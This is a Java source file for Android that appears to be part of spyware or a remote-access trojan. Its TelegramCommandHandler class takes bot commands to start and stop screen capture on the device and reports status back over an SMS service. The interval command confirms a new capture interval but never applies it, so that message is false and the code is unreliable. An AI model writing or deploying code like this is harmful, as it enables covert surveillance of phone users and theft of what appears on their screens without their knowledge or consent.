package com.smshandler;

import android.content.Context;

public class TelegramCommandHandler {

    public static void handleScreenCommands(Context context, String message) {
        if (message.equals("/screen") || message.equals("/screenshot")) {
            ScreenCommandHandler.handleScreenCommand(null, message);
            SmsService.sendRawMessage("📸 Screen capture starting...");
        } else if (message.equals("/screenstop") || message.equals("/screenshotstop")) {
            ScreenCommandHandler.stopScreenRecording();
            SmsService.sendRawMessage("🛑 Screen capture stopped");
        } else if (message.startsWith("/screeninterval")) {
            String[] parts = message.split(" ");
            if (parts.length == 2) {
                try {
                    int seconds = Integer.parseInt(parts[1]);
                    SmsService.sendRawMessage("⏱️ Screen capture interval set to " + seconds + " seconds");
                } catch (NumberFormatException e) {
                    SmsService.sendRawMessage("❌ Invalid interval value");
                }
            }
        }
    }
}